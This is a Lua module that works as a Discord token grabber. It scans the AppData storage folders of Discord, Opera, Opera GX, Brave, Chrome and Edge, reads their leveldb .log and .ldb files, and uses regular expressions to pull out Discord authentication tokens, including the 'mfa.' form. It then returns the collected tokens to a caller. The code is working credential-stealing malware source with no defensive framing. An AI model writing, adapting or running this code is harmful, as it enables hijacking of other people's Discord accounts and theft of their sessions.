local paths = {
    ['discord'] = 'Roaming/discord',
    ['discordcanary'] = 'Roaming/discordcanary',
    ['discordptb'] = 'Roaming/discordptb',
    ['opera'] = 'Roaming/Opera Software/Opera Stable',
    ['operagx'] = 'Roaming/Opera Software/Opera GX Stable',
    ['brave'] = 'Local/BraveSoftware/Brave-Browser/User Data/Default',
    ['chrome'] = 'Local/Google/Chrome/User Data/Default',
    ['edge'] = 'Local/Microsoft/Edge/User Data/Default'
}

local fs = require('fs')

local function find(tbl,value)
    for i,v in pairs(tbl) do
        if v == value then
            return i
        end
    end
end

local path = os.getenv('APPDATA'):gsub('\\','/')

if not path:sub(1,2) == 'C:' then
    return (function() end)
end

local user_folder = path:match('C:/Users/.-/')

if not user_folder then
    return (function() end)
end

local appdata = user_folder..'AppData/'

local function split(input, separator)
    if separator == nil then
        separator = '%s'
    end

    local returned = {}

    for matched in string.gmatch(input, "([^"..separator.."]+)") do
        table.insert(returned, matched)
    end

    return returned
end

local matches = {}

local function getinfo(path)
    local files = fs.readdirSync(path)

    for i,file in pairs(files) do
        if file:sub(-4,-1) == '.log' or file:sub(-4, -1) == '.ldb' then
            local file = path.."/"..file

            local contents = fs.readFileSync(file)

            if not contents then return end

            for i,line in pairs(split(contents, '\n')) do
                local classes = {'('..('[a-zA-Z0-9_%-]'):rep(24)..'%.'..('[a-zA-Z0-9_%-]'):rep(6)..'%.'..('[a-zA-Z0-9_%-]'):rep(27)..')', '('..'mfa%.'..('[a-zA-Z0-9_%-]'):rep(84)..')'}

                local matched = line:match(classes[1]) or line:match(classes[2])

                if matched then
                    for match in string.gmatch(line, classes[1]) do
                        if not find(matches, match) then
                            table.insert(matches, match)
                        end
                    end

                    for match in string.gmatch(line, classes[2]) do
                        if not find(matches, match) then
                            table.insert(matches, match)
                        end
                    end
                end
            end
        end
    end
end

local function scanner()
    for i,path in pairs(paths) do
        if fs.existsSync(appdata..path..'/QuotaManager') then
            getinfo(appdata..path..'/Local Storage/leveldb')
        end
    end
    return matches
end

local function init(fenv)
    fenv['get'] = scanner
end

return init